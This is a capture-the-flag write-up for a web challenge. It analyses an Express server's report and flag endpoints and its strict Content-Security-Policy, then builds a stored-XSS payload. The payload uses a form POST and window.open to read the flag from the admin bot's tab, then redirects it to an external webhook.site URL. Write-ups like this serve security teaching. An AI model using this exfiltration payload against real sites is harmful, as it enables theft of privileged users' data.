# California State Police

Lets report some cybercrime 🚔🚔🚔🚔🚔

![prompt](https://i.imgur.com/wgtZemX.png)

## Reconnaisance

We are given `index.js` of the server which is an express app.

`GET /report/:id` endpoint seems to return an html document of our choosing because it sets the mimetype to `text/html` and sends the crime we submit. Since the challenge has an admin bot, we can infer that we are supposed to get the admin to visit our site which will cause us to capture the flag.

```js
app.get("/report/:id", (req, res) => {
  if (reports.has(req.params.id)) {
    res.type("text/html").send(reports.get(req.params.id));
  }
  ...
});
```

`POST /report` allows us to report a cybercrime. There is essentially no filtering done on this endpoint (other than length checking)

```js
app.post("/report", (req, res) => {
  res.type("text/plain");
  const crime = req.body.crime;
  ...
  const id = uuid();
  reports.set(id, crime);
  cleanup.push([id, Date.now() + 1000 * 60 * 60 * 3]);
  res.redirect("/report/" + id);
});
```

`POST /flag` is the only way to recover the flag (as `GET /flag` returns an error)

```js
app.post("/flag", (req, res) => {
  if (req.cookies.adminpw === adminpw) {
    res.send(flag);
  } else {
    res.status(400).send("no hacking allowed");
  }
});
```

And finally, there is a `Content-Security-Policy` of `default-src 'none'; script-src 'unsafe-inline'` which means that we cannot load external resources and we can only run inline scripts.

## Exploitation

Since the content-security-policy has a default-src of none, we cannot use fetch to `POST /flag` and then send the flag to a webhook. I tried submitting a payload of

```html
<script defer>
  fetch('/flag', { method: 'POST' })
</script>
```

but in the console, I saw that csp blocked the fetch request.

![cspblock](https://i.imgur.com/xFxwqie.png)

This means we have to use other methods of sending requests like redirects and forms.

HTML `<form>` element can be used to send post requests with the `action` and `method` attributes.

```html
<!-- POST to /flag -->
<form action="/flag" method="POST">
  <input type="submit" value="Submit" />
</form>

<script defer>
  // click submit button
  document.querySelector('[type=submit]').click();
</script>
```

Submitting this payload successfully allows us to send a `POST /flag` as shown by the response of `no hacking allowed` (which is in the post handler).

![nohacking](https://i.imgur.com/Qma8iH9.png)

Now that we can send a post request to get the flag, we need some way to retrieve the flag. Since we used a form to submit the post request, the page redirects to `/flag` after the request is sent. This means we cannot read the flag because it is on a page we do not have js running on.

My initial plan was to embed an `<iframe>` into the page which submits `POST /flag` and then observe the page's contents for the flag. However, CSP applies to iframes so we cannot use them.

There is another similar approach that can work. `window.open(url)` in js will open a url in a new tab and return the window object of the tab. If the url is of the same domain, we can access ALL of the windows properties of that tab (including the document).

We can devise a payload that has two parts: one that redirects to the flag and one that observes the flag tab for the flag and sends it back to a webhook. We can send the flag back to the webhook by redirecting to our webhook site and appending the flag as a query parameter. The final payload (with comments) is below. Submitting the payload with these comments will fail because `lactf` in the payload causes recursive `window.open()` calls.

```html
<form action="/flag" method="POST">
  <input type="submit" value="Submit" />
</form>

<script defer>
  // url with #nyahallo at the end will be the one that submits the form
  // other url will observe #nyahallo
  if (window.location.hash == '#nyahallo') {
    document.querySelector('[type=submit]').click();
  } else {
    const other = window.open(window.location.href + '#nyahallo');
    const interval = setInterval(() => {
      // check for lactf,
      // using 'lactf' instead of 'la'+'ctf' results in recursive
      // window.open()
      if (!other.document.body.innerHTML.includes('la'+'ctf')) return;
      window.location.href = 'https://webhook.site/106fefb8-2bfa-4ade-889f-b6a24297c8ec?flag=' + encodeURIComponent(other.document.body.innerHTML);
      // avoid spamming window.open()
      clearInterval(interval);
    }, 100);
  }
</script>
```

After I submitted the crime link with the body of above payload to the admin bot, we see the webhook request and the flag has been captured.

![webhook](https://i.imgur.com/wZxtmcR.png)